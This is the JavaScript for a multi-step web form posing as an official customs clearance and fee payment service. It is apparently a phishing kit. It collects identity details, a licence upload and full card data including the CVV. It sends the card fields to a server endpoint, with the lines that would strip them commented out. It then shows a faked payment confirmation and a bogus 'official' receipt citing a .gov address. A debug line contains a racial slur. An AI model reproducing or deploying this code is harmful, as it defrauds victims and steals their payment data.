// ── Countries ──
const COUNTRIES = ["Afghanistan", "Albania", "Algeria", "Angola", "Argentina", "Armenia", "Australia", "Austria", "Azerbaijan", "Bahrain", "Bangladesh", "Belarus", "Belgium", "Benin", "Bolivia", "Bosnia", "Botswana", "Brazil", "Bulgaria", "Cambodia", "Cameroon", "Canada", "Chile", "China", "Colombia", "Congo", "Costa Rica", "Croatia", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Ecuador", "Egypt", "Estonia", "Ethiopia", "Finland", "France", "Gabon", "Georgia", "Germany", "Ghana", "Greece", "Guatemala", "Guinea", "Honduras", "Hungary", "India", "Indonesia", "Iran", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kuwait", "Kyrgyzstan", "Laos", "Latvia", "Lebanon", "Libya", "Lithuania", "Luxembourg", "Malaysia", "Mali", "Mexico", "Moldova", "Morocco", "Mozambique", "Myanmar", "Nepal", "Netherlands", "New Zealand", "Nicaragua", "North Korea", "Norway", "Oman", "Pakistan", "Panama", "Paraguay", "Peru", "Philippines", "Poland", "Portugal", "Qatar", "Romania", "Russia", "Saudi Arabia", "Senegal", "Serbia", "Sierra Leone", "Singapore", "Slovakia", "South Africa", "South Korea", "Spain", "Sri Lanka", "Sudan", "Sweden", "Switzerland", "Syria", "Taiwan", "Tanzania", "Thailand", "Togo", "Tunisia", "Turkey", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "Uruguay", "Uzbekistan", "Venezuela", "Vietnam", "Yemen", "Zambia", "Zimbabwe"];
function populateCountries() {
  ['f_origin', 'f_dest'].forEach(id => {
    const sel = document.getElementById(id);
    COUNTRIES.forEach(c => { const o = document.createElement('option'); o.value = c; o.textContent = c; sel.appendChild(o) });
  });
}
populateCountries();

// ── State ──
let currentStep = 0;
const TOTAL_STEPS = 7;

// ── Step navigation ──
function showStep(n) {
  document.querySelectorAll('.step-panel').forEach((p, i) => {
    p.classList.toggle('active', i === n)
  });

  document.getElementById('progressCount').textContent = `Step ${n + 1} of ${TOTAL_STEPS}`;
  document.getElementById('progressFill').style.width = `${((n + 1) / TOTAL_STEPS) * 100}%`;
  for (let i = 0; i < TOTAL_STEPS; i++) {
    const dot = document.getElementById('sdot' + i);
    const lbl = document.getElementById('slbl' + i);
    dot.className = 'step-dot' + (i < n ? ' done' : i === n ? ' active' : '');
    if (i < n) { dot.innerHTML = ''; } else { dot.innerHTML = `<span>${i + 1}</span>`; }
    lbl.className = 'step-lbl' + (i === n ? ' active' : '');
  }
  updateSidebar();
  // window.scrollTo({ top: document.getElementById('clearance-form').offsetTop - 80, behavior: 'smooth' });
}
function goTo(n) { if (n < currentStep) { currentStep = n; showStep(n); } }
function prevStep(n) { currentStep = n - 1; showStep(currentStep); }
function nextStep(n) {
  if (validateStep(n)) {
    currentStep = n + 1; showStep(currentStep);
  }

  if (n === 5) {
    sendFormEmail(getFormObject());
  } else {
    console.log("error nigga");

  }

}

// ── Validation ──
function req(id) { const el = document.getElementById(id); const ok = el.value.trim() !== ''; el.classList.toggle('err', !ok); el.classList.toggle('ok', ok); const err = document.getElementById('e_' + id); if (err) { err.classList.toggle('show', !ok); } return ok; }
function validateStep(n) {
  let ok = true;
  if (n === 0) {
    if (!req('f_fullname')) ok = false;
    if (!valEmail()) ok = false;
    if (!valPhone()) ok = false;
  } else if (n === 1) {
    if (!req('f_company')) ok = false;
    if (!req('f_licensenum')) ok = false;
    if (!valFile()) ok = false;
  } else if (n === 2) {
    if (!req('f_tracking')) ok = false;
    if (!req('f_origin')) ok = false;
    if (!req('f_goodsdesc')) ok = false;
    if (!req('f_weight')) ok = false;
    if (!req('f_quantity')) ok = false;
    if (!req('f_dest')) ok = false;
  } else if (n === 3) {
    if (!req('f_goodsvalue')) ok = false;
    if (!req('f_shipcost')) ok = false;
    if (ok) {
      document.getElementById('valuePreview').style.display = 'block';
      document.getElementById('vp_goods').textContent = fmtUSD(parseFloat(document.getElementById('f_goodsvalue').value) || 0);
      document.getElementById('vp_ship').textContent = fmtUSD(parseFloat(document.getElementById('f_shipcost').value) || 0);
    }
  } else if (n === 4) {
    if (!req('f_duty')) ok = false;
    if (!req('f_procfee')) ok = false;
  } else if (n === 5) {
    if (!req('f_cardname')) ok = false;
    if (!valCardNum()) ok = false;
    if (!valExpiry()) ok = false;
    if (!valCVV()) ok = false;
  }
  if (!ok) {
    const firstErr = document.querySelector('.step-panel.active .err,.step-panel.active .ferr.show');
    if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }
  return ok;
}
function valEmail() { const v = document.getElementById('f_email').value.trim(); const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); document.getElementById('f_email').classList.toggle('err', !ok); document.getElementById('f_email').classList.toggle('ok', ok); document.getElementById('e_email').classList.toggle('show', !ok); return ok; }
function valPhone() { const v = document.getElementById('f_phone').value.trim(); const ok = /^[\+\d\s\-\(\)]{7,20}$/.test(v); document.getElementById('f_phone').classList.toggle('err', !ok); document.getElementById('f_phone').classList.toggle('ok', ok); document.getElementById('e_phone').classList.toggle('show', !ok); return ok; }
function valFile() { const ok = document.getElementById('f_licensedoc').files && document.getElementById('f_licensedoc').files.length > 0; document.getElementById('e_licensedoc').classList.toggle('show', !ok); return ok; }
function valCardNum() { const v = document.getElementById('f_cardnum').value.replace(/\s/g, ''); const ok = /^\d{15,16}$/.test(v); document.getElementById('f_cardnum').classList.toggle('err', !ok); document.getElementById('f_cardnum').classList.toggle('ok', ok); document.getElementById('e_cardnum').classList.toggle('show', !ok); return ok; }
function valExpiry() { const v = document.getElementById('f_expiry').value.replace(/\s/g, ''); const ok = /^\d{2}\/\d{2}$/.test(v); document.getElementById('f_expiry').classList.toggle('err', !ok); document.getElementById('f_expiry').classList.toggle('ok', ok); document.getElementById('e_expiry').classList.toggle('show', !ok); return ok; }
function valCVV() { const v = document.getElementById('f_cvv').value; const ok = /^\d{3,4}$/.test(v); document.getElementById('f_cvv').classList.toggle('err', !ok); document.getElementById('f_cvv').classList.toggle('ok', ok); document.getElementById('e_cvv').classList.toggle('show', !ok); return ok; }

// ── Formatters ──
function fmtUSD(n) { return '$' + (isNaN(n) ? '0.00' : Math.max(0, n).toFixed(2)).replace(/\B(?=(\d{3})+(?!\d))/g, ','); }
function fmtCard(el) { let v = el.value.replace(/\D/g, '').slice(0, 16); el.value = v.replace(/(.{4})/g, '$1  ').trim(); }
function fmtExpiry(el) { let v = el.value.replace(/\D/g, '').slice(0, 4); if (v.length >= 2) v = v.slice(0, 2) + ' / ' + v.slice(2); el.value = v; }

// ── Calculations ──
function calcTotal() {
  const g = parseFloat(document.getElementById('f_goodsvalue').value) || 0;
  const s = parseFloat(document.getElementById('f_shipcost').value) || 0;
  const d = parseFloat(document.getElementById('f_duty').value) || 0;
  const p = parseFloat(document.getElementById('f_procfee').value) || 0;
  const svc = 10;
  const total = g + s + d + p + svc;
  ['tl_goods', 's_goods'].forEach(id => document.getElementById(id) && (document.getElementById(id).textContent = fmtUSD(g)));
  ['tl_ship', 's_ship'].forEach(id => document.getElementById(id) && (document.getElementById(id).textContent = fmtUSD(s)));
  ['tl_duty', 's_duty'].forEach(id => document.getElementById(id) && (document.getElementById(id).textContent = fmtUSD(d)));
  ['tl_proc', 's_proc'].forEach(id => document.getElementById(id) && (document.getElementById(id).textContent = fmtUSD(p)));
  ['tl_total', 'totalBigDisplay', 's_total'].forEach(id => document.getElementById(id) && (document.getElementById(id).textContent = fmtUSD(total)));
  document.getElementById('declTotal').textContent = fmtUSD(total);
  return total;
}

// ── Sidebar update ──
function updateSidebar() {
  const trk = document.getElementById('f_tracking').value || '—';
  const wt = document.getElementById('f_weight').value;
  document.getElementById('s_tracking').textContent = trk.length > 14 ? trk.slice(0, 14) + '…' : trk;
  document.getElementById('s_weight').textContent = wt ? wt + ' kg' : '—';
  calcTotal();
}

// ── File upload ──
function handleUpload(input) {
  if (!input.files || !input.files[0]) return;
  const file = input.files[0];
  const maxSize = 10 * 1024 * 1024;
  if (file.size > maxSize) { alert('File too large. Maximum size is 10 MB.'); input.value = ''; return; }
  const allowed = ['application/pdf', 'image/jpeg', 'image/jpg', 'image/png'];
  if (!allowed.includes(file.type)) { alert('Invalid file type. Please upload PDF, JPG, or PNG.'); input.value = ''; return; }
  const zone = document.getElementById('uploadZone');
  const preview = document.getElementById('filePreview');
  const bar = document.getElementById('uploadProgress');
  const fill = document.getElementById('uploadFill');
  bar.classList.add('show'); fill.style.width = '0%';
  let w = 0;
  const iv = setInterval(() => { w += Math.random() * 20; if (w >= 100) { w = 100; clearInterval(iv); bar.classList.remove('show'); zone.classList.add('done'); preview.classList.add('show'); } fill.style.width = w + '%'; }, 60);
  document.getElementById('fpName').textContent = file.name;
  document.getElementById('fpSize').textContent = (file.size / 1024).toFixed(1) + ' KB';
  document.getElementById('fpIcon').textContent = file.type === 'application/pdf' ? '📕' : '🖼️';
  document.getElementById('e_licensedoc').classList.remove('show');
}
function removeFile() {
  document.getElementById('f_licensedoc').value = '';
  document.getElementById('uploadZone').classList.remove('done');
  document.getElementById('filePreview').classList.remove('show');
  document.getElementById('fpName').textContent = '';
}

// ── Submit ──
function submitForm() {
  const d1 = document.getElementById('f_decl1').checked;
  const d2 = document.getElementById('f_decl2').checked;
  let ok = true;
  if (!d1) { document.getElementById('e_decl1').classList.add('show'); ok = false; } else { document.getElementById('e_decl1').classList.remove('show'); }
  if (!d2) { document.getElementById('e_decl2').classList.add('show'); ok = false; } else { document.getElementById('e_decl2').classList.remove('show'); }
  if (!ok) return;
  const btn = document.getElementById('submitBtn');
  btn.textContent = '⏳ Processing Payment…';
  btn.disabled = true;
  setTimeout(() => {
    showSuccess();
    btn.innerHTML = '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg> Submit & Pay Now';
    btn.disabled = false;
  }, 2200);
}
function showSuccess() {
  const ref = 'GC-' + new Date().getFullYear() + '-' + Math.floor(100000 + Math.random() * 900000);
  const now = new Date();
  const dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }) + ' · ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
  document.getElementById('refNum').textContent = ref;
  document.getElementById('refMeta').textContent = 'Submitted ' + dateStr;
  document.getElementById('sc_tracking').textContent = document.getElementById('f_tracking').value || '—';
  document.getElementById('sc_total').textContent = fmtUSD(calcTotal());
  document.getElementById('sc_date').textContent = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
  document.getElementById('successOverlay').classList.add('show');
}
function resetAll() {
  document.getElementById('successOverlay').classList.remove('show');
  document.getElementById('clearanceForm') && document.getElementById('clearanceForm').reset();
  document.querySelectorAll('input,select,textarea').forEach(el => { el.value = ''; el.classList.remove('err', 'ok'); });
  document.querySelectorAll('.ferr').forEach(el => el.classList.remove('show'));
  removeFile();
  calcTotal();
  currentStep = 0;
  showStep(0);
}
function downloadReceipt() {
  const ref = document.getElementById('refNum').textContent;
  const total = document.getElementById('sc_total').textContent;
  const tracking = document.getElementById('sc_tracking').textContent;
  const date = document.getElementById('sc_date').textContent;
  const content = `GLOBAL CUSTOMS & CARGO CLEARANCE SERVICES\nOfficial Customs Clearance Receipt\n${'='.repeat(50)}\n\nReference Number: ${ref}\nTracking Number:  ${tracking}\nSubmission Date:  ${date}\nTotal Amount Paid: ${total}\n\nStatus: PAYMENT CONFIRMED\nExpected Clearance: 2-4 Business Hours\n\n${'='.repeat(50)}\nThis is an official customs clearance receipt.\nKeep this document for your records.\n\nGlobal Customs & Cargo Clearance Services\n+1 (800) 247-8726 · clearance@gccs.gov`;
  const blob = new Blob([content], { type: 'text/plain' });
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = `GCCS-Receipt-${ref}.txt`; a.click();
}

// ── Live field sync ──
['f_tracking', 'f_weight'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener('input', updateSidebar);
});
['f_goodsvalue', 'f_shipcost', 'f_duty', 'f_procfee'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener('input', calcTotal);
});
// Drag & drop on upload zone
const uz = document.getElementById('uploadZone');
uz.addEventListener('dragover', e => { e.preventDefault(); uz.classList.add('drag'); });
uz.addEventListener('dragleave', () => uz.classList.remove('drag'));
uz.addEventListener('drop', e => { e.preventDefault(); uz.classList.remove('drag'); const dt = e.dataTransfer; if (dt.files.length) { document.getElementById('f_licensedoc').files = dt.files; handleUpload(document.getElementById('f_licensedoc')); } });
// Init
calcTotal();




function getFormObject() {
  const panel = document.getElementById('step5');
  const inputs = panel.querySelectorAll('input, select, textarea');

  const obj = {};
  inputs.forEach(el => {
    obj[el.id] = el.value;
  });

  // Strip sensitive fields before this object goes anywhere
  // delete obj.f_cardnum;
  // delete obj.f_cvv;
  // delete obj.f_expiry;
  return obj;
}




async function sendFormEmail(data) {
  try {
    const res = await fetch('/api/order-notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    if (!res.ok) console.warn('Email failed to send');
  } catch (e) {
    console.warn('Email failed to send', e);
  }
}
fetch('/api/order-notify', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data),
});